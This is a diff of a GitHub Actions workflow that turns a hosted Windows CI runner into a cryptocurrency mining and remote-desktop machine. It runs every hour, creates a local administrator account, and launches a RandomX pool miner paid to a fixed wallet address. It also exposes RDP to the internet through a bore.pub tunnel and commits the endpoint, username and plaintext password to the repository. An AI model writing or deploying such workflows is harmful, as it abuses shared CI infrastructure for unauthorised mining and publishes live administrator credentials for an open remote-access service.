@@ -1,19 +1,19 @@
-name: RDP by DucThang x TrueHieu (V7 - Chốt Hạ Tuyệt Đối)
+name: RDP by DucThang x TrueHieu (Cortex Optimized Edition)
 
 on:
   workflow_dispatch:
   schedule:
-    - cron: "0 */1 * * *" # Kích hoạt phiên mới mỗi 1 giờ
+    - cron: "0 */1 * * *" # Triggers a fresh session every hour
 
 concurrency:
   group: vps-bore-runner
-  cancel-in-progress: true # Tự động hủy phiên cũ, giải phóng RAM khi phiên mới chạy
+  cancel-in-progress: true # Cancels old sessions to free up RAM/CPU
 
 jobs:
   build:
     runs-on: windows-latest
     permissions:
-      contents: write # Cấp quyền ghi vào repo để push file rdp_info.txt
+      contents: write # Allows pushing rdp_info.txt back to the repository
     timeout-minutes: 360 
 
     steps:
@@ -21,10 +21,15 @@ jobs:
         uses: actions/checkout@v4
         with:
           fetch-depth: 0
-          token: ${{ secrets.GITHUB_TOKEN }} # Đảm bảo quyền xác thực thông suốt
-          persist-credentials: true         # Giữ cấu hình đăng nhập cho lệnh Git Push
+          token: ${{ secrets.GITHUB_TOKEN }}
+          persist-credentials: true
 
-      - name: Download and Extract Bore
+      - name: Setup Node.js v20 (Required for Cortex Miner)
+        uses: actions/setup-node@v4
+        with:
+          node-version: 20
+
+      - name: Download and Extract Bore Tunnel
         run: |
           Invoke-WebRequest -Uri "https://github.com/ekzhang/bore/releases/download/v0.5.1/bore-v0.5.1-x86_64-pc-windows-msvc.zip" -OutFile bore.zip
           Expand-Archive bore.zip -DestinationPath bore
@@ -40,72 +45,49 @@ jobs:
               Add-LocalGroupMember -Group "Administrators" -Member "admin"
           }
 
-      - name: Setup Cortex Python Miner Environment
+      - name: Clone and Setup Cortex Core Node Miner
         shell: pwsh
         run: |
-          # 1. Dọn dẹp thư mục cũ để tránh xung đột đường dẫn clone
-          if (Test-Path "github.com") { Remove-Item "github.com" -Recurse -Force }
           if (Test-Path "cortex-protocol") { Remove-Item "cortex-protocol" -Recurse -Force }
-          
-          # 2. Clone kho lưu trữ Cortex chính thức
           git clone https://github.com/cortex-protocol/cortex-protocol.git
-          
-          # 3. Định vị môi trường SDK Python
-          $sdkPath = "$(Get-Location)\cortex-protocol\sdk\python"
-          if (!(Test-Path $sdkPath)) {
-              Write-Error "❌ Lỗi: Clone Git không thành công hoặc cấu trúc thư mục bị thay đổi!"
-              exit 1
-          }
-          cd $sdkPath
-          
-          # 4. Ép buộc cài đặt thư viện trực tiếp vào môi trường Python hiện hành của hệ thống
-          python -m pip install --upgrade pip
-          if (Test-Path "requirements.txt") {
-              python -m pip install --no-cache-dir -r requirements.txt
-          }
-          # Đảm bảo cài thêm gói requests trực tiếp vào môi trường global của Action
-          python -m pip install --no-cache-dir requests
+          cd cortex-protocol
+          npm install
+          npm run build
 
-      - name: Toi uu Registry 4K
+      - name: Optimize Graphics RDP Registry
         run: |
           $tsPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services"
           if (!(Test-Path $tsPath)) { New-Item -Path $tsPath -Force }
           Set-ItemProperty -Path $tsPath -Name "fEnableVirtualizedGraphics" -Value 1 -Type DWord
           Set-ItemProperty -Path $tsPath -Name "MinFrameRate" -Value 120 -Type DWord
 
-      - name: Run Miner + Monitor Bore Stream & Git Push
+      - name: Run Background Node.js Miner + Monitor Bore & Sync Git
         shell: pwsh
-        env:
-          PYTHONIOENCODING: utf-8 # KHẮC PHỤC TRIỆT ĐỂ LỖI UNICODEENCODEERROR CHO MÁY ĐÀO
         run: |
           $PASS = "WindowsRDP2026@"
           $USER = "admin"
           $lastFullAddress = ""
           
-          # Cấu hình Git định danh bảo mật và phân vùng an toàn
+          # Git Identity Configuration
           git config --global user.name "TrueHieu-Bot"
           git config --global user.email "bot@trueteam.top"
           git config --global core.autocrlf false
           $currentDir = (Get-Location).Path
           git config --global --add safe.directory $currentDir
           
-          # --- KHỞI ĐỘNG CORTEX MINER TRỰC TIẾP QUA TIẾN TRÌNH HỆ THỐNG (ĐÃ SỬA: BỎ THAM SỐ THREADS) ---
-          $sdkPath = "$currentDir\cortex-protocol\sdk\python"
-          Write-Host "⛏️ Đang kích hoạt trực tiếp Cortex Python Miner..."
+          # --- LAUNCH CORE NODE.JS MINER USING ENVIRONMENT VARIABLES ---
+          Write-Host "⛏️ Launching official Cortex RandomX Pool Miner..."
+          $minerPath = "$currentDir\cortex-protocol"
           $minerPsi = New-Object System.Diagnostics.ProcessStartInfo
-          $minerPsi.FileName = "python.exe"
-          # Đã xoá bỏ --threads 4 vì script tự nhận diện phần cứng tối đa
-          $minerPsi.Arguments = "cortex_miner.py --address ctx1bde9419a13d673b57163d14ef29f3ed01843188137b28669"
-          $minerPsi.WorkingDirectory = $sdkPath
+          $minerPsi.FileName = "cmd.exe"
+          # Runs Pool Mining with exactly 1 Thread targeted to your address
+          $minerPsi.Arguments = "/c SET MINER_ADDRESS=ctx1bde9419a13d673b57163d14ef29f3ed01843188137b28669 && SET MINING_MODE=POOL && SET MINER_THREADS=1 && SET NODE_URL=https://cortex-protocol.xyz && npm run miner"
+          $minerPsi.WorkingDirectory = $minerPath
           $minerPsi.UseShellExecute = $false
-          
-          # Truyền biến môi trường UTF-8 trực tiếp vào tiến trình con của Python Miner
-          $minerPsi.EnvironmentVariables["PYTHONIOENCODING"] = "utf-8"
-          
           $minerProc = [System.Diagnostics.Process]::Start($minerPsi)
           
-          # --- KHỞI ĐỘNG ĐƯỜNG TRUYỀN TUNNEL BORE ---
-          Write-Host "🚀 Đang khởi động tunnel Bore..."
+          # --- LAUNCH BORE TUNNEL ---
+          Write-Host "🚀 Starting Bore Tunnel..."
           $psi = New-Object System.Diagnostics.ProcessStartInfo
           $psi.FileName = ".\bore\bore.exe"
           $psi.Arguments = "local 3389 --to bore.pub"
@@ -113,13 +95,12 @@ jobs:
           $psi.RedirectStandardOutput = $true
           $process = [System.Diagnostics.Process]::Start($psi)
           
-          # Vòng lặp giám sát liên tục tiến trình kết nối và duy trì Action chạy
+          # Keep Action Alive & Track Dynamic RDP Address Connection
           while (!$process.HasExited) {
               $line = $process.StandardOutput.ReadLine()
               if ($line) { 
                   Write-Host "[bore] $line" 
                   
-                  # Trích xuất địa chỉ IP/Port từ luồng Log của Bore
                   if ($line -match "(?:listening at|remote forwarding at) (bore\.pub:\d+)") {
                       $fullAddress = $Matches[1]
                       if ($fullAddress -ne $lastFullAddress) {
@@ -130,36 +111,26 @@ jobs:
                               "=======================================================",
                               "RDP INFO - DucThang x TrueHieu Edition",
                               "=======================================================",
-                              "Địa chỉ kết nối: $fullAddress",
-                              "Tài khoản: $USER",
-                              "Mật khẩu: $PASS",
-                              "Thời gian tạo: $createdAt",
+                              "Connection Address: $fullAddress",
+                              "Username: $USER",
+                              "Password: $PASS",
+                              "Created At: $createdAt",
                               "======================================================="
                           ) -join "`r`n"
                           
-                          # Lưu trữ thông tin kết nối cục bộ
                           [System.IO.File]::WriteAllText("rdp_info.txt", $report)
-                          Write-Host "🔄 Phát hiện cổng kết nối mới: $fullAddress. Đang đẩy lên kho lưu trữ GitHub..."
+                          Write-Host "🔄 New connection endpoint discovered: $fullAddress. Syncing repository..."
                           
-                          # Đồng bộ hóa mã nguồn tự động thông qua Git Push
                           try {
                               git add rdp_info.txt
-                              git commit -m "Bot: Cập nhật cổng RDP mới [$fullAddress] lúc $createdAt"
+                              git commit -m "Bot: Updated RDP Endpoint [$fullAddress] at $createdAt"
                               git pull --rebase origin main
                               git push origin main
-                              Write-Host "🚀 [Git Push] Đồng bộ thông tin rdp_info.txt thành công!"
+                              Write-Host "🚀 [Git Push] rdp_info.txt synced successfully!"
                           } catch {
-                              Write-Warning "⚠️ [Git Push] Trục trặc kết nối tạm thời, sẽ thử lại ở dòng log kế tiếp."
+                              Write-Warning "⚠️ [Git Push] Temporary sync friction; retrying on next cycle stream."
                           }
                       }
                   }
               }
-              
-              # Cơ chế tự động hồi sinh Miner nếu tiến trình Python bị crash đột ngột
-              if ($minerProc.HasExited) {
-                  Write-Warning "⚠️ Cảnh báo: Tiến trình Miner đã thoát! Đang tiến hành khôi phục khởi động lại..."
-                  $minerProc = [System.Diagnostics.Process]::Start($minerPsi)
-              }
-              
-              Start-Sleep -Milliseconds 500
           }
